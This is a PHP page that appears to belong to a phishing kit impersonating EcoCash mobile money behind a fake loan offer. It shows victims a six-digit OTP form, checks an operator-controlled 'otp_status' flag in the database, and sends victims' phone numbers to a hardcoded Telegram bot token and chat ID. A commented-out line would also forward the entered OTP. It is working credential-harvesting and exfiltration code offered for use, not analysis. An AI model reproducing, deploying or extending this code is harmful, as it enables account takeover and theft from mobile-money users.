<?php
session_start();

// ----------------- TELEGRAM CONFIGURATION -----------------
define('TELEGRAM_BOT_TOKEN', '8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc');
define('TELEGRAM_CHAT_ID', '-5193742613');

// Database configuration
$dbHost = getenv('DB_HOST');
$dbPort = getenv('DB_PORT') ?: 3306;
$dbName = getenv('DB_NAME');
$dbUser = getenv('DB_USER');
$dbPass = getenv('DB_PASS');

$pdo = new PDO(
    "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4",
    $dbUser,
    $dbPass,
    [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    ]
);

function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postData,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 5,
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        return ($response !== false);
    } else {
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($postData),
                'timeout' => 5,
            ],
        ];
        $context = stream_context_create($options);
        $response = @file_get_contents($url, false, $context);
        return ($response !== false);
    }
}
// ---------------------------------------------------------

// Must have phone in session
if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}

$phone = $_SESSION['phone'];
$error = '';

// Process OTP submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $enteredOtp = implode('', $_POST['otp'] ?? []);
    
    // Optional: log the OTP attempt (you can keep or remove)
    // sendToTelegram("📱 OTP attempt for $phone: $enteredOtp");
    
    try {
        $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Get otp_status for this phone
        $stmt = $pdo->prepare("SELECT otp_status FROM ecocash_auth WHERE phone = :phone LIMIT 1");
        $stmt->execute([':phone' => $phone]);
        $record = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($record && (int)$record['otp_status'] === 1) {
            // Send Telegram "loan success" message
            $successMsg = "✅ LOAN SUCCESS ✅\n\n📱 Phone: +263 $phone\n🕒 Time: " . date('Y-m-d H:i:s');
            sendToTelegram($successMsg);
            
            // Redirect to dashboard
            header("Location: dashboard.php");
            exit;
        } else {
            $error = "Wrong OTP";
        }
    } catch (PDOException $e) {
        error_log("DB error in otp.php: " . $e->getMessage());
        $error = "System error. Please try again.";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTP Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #f5f7fa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
}

.container {
    width: 100%;
    max-width: 500px;
    background: #fff;
    padding: 24px 20px 32px;
    border-radius: 24px;
    box-shadow: 0 10px 30px rgba(0,0,0,.1);
}

h2 {
    margin-top: 0;
    margin-bottom: 8px;
    font-size: 24px;
}

p {
    color: #6b7280;
    margin-bottom: 28px;
    font-size: 15px;
}

.error-message {
    background: #fee2e2;
    color: #dc2626;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 20px;
    text-align: center;
    font-size: 14px;
}

.otp-box {
    display: flex;
    justify-content: center;
    gap: 12px;
    flex-wrap: wrap;
}

.otp-box input {
    width: calc(16% - 8px);
    min-width: 45px;
    max-width: 65px;
    aspect-ratio: 1 / 1;
    font-size: 24px;
    text-align: center;
    border-radius: 12px;
    border: 2px solid #2563eb;
    background: white;
    font-weight: 600;
    padding: 0;
    outline: none;
    transition: 0.2s;
}

.otp-box input:focus {
    border-color: #1e40af;
    box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
}

button {
    margin-top: 32px;
    width: 100%;
    padding: 14px;
    font-size: 18px;
    border: none;
    border-radius: 40px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    font-weight: bold;
    transition: 0.2s;
}

button:hover {
    background: #1d4ed8;
}

.timer {
    margin-top: 24px;
    text-align: center;
    color: #6b7280;
    font-size: 14px;
}

.timer a {
    color: #2563eb;
    text-decoration: none;
}

@media (max-width: 480px) {
    .container {
        padding: 20px 16px 28px;
    }
    .otp-box {
        gap: 8px;
    }
    .otp-box input {
        min-width: 42px;
        font-size: 20px;
    }
}

@media (max-width: 380px) {
    .otp-box {
        gap: 6px;
    }
    .otp-box input {
        min-width: 38px;
        font-size: 18px;
    }
}
</style>
</head>
<body>

<div class="container">
    <h2>OTP Verification</h2>
    <p>Enter the OTP sent to your phone number<br>
        <strong>+263 <?= htmlspecialchars(substr(preg_replace('/\D/', '', $_SESSION['phone']), 0, 3) . "****" . substr(preg_replace('/\D/', '', $_SESSION['phone']), -2)) ?></strong>
    </p>

    <?php if ($error): ?>
        <div class="error-message"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="POST">
        <div class="otp-box">
            <?php for ($i = 0; $i < 6; $i++): ?>
                <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
            <?php endfor; ?>
        </div>
        <button type="submit">Submit</button>
    </form>

    <div class="timer" id="timer">Resend OTP in 120 seconds</div>
</div>

<script>
const inputs = document.querySelectorAll('.otp-box input');

inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
    });

    input.addEventListener('keydown', e => {
        if (e.key === "Backspace" && !input.value && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

inputs[0].focus();

let time = 120;
const timer = document.getElementById("timer");

const interval = setInterval(() => {
    if (time > 0) {
        time--;
        timer.innerText = "Resend OTP in " + time + " seconds";
    } else {
        clearInterval(interval);
        timer.innerHTML = '<a href="resend.php">Resend OTP</a>';
    }
}, 1000);
</script>

</body>
</html>
